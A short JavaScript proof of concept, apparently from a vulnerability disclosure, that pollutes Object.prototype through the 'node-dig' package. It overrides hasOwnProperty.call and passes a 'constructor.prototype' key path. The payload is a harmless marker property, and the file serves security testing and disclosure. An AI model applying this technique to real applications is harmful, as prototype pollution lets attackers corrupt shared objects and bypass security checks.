Object.prototype.hasOwnProperty.call = () => true;
const nodeDig = require('node-dig');
console.log({}.polluted);
nodeDig({}, [
    'constructor',
    'prototype',
    'polluted'
], 'yes');
console.log({}.polluted);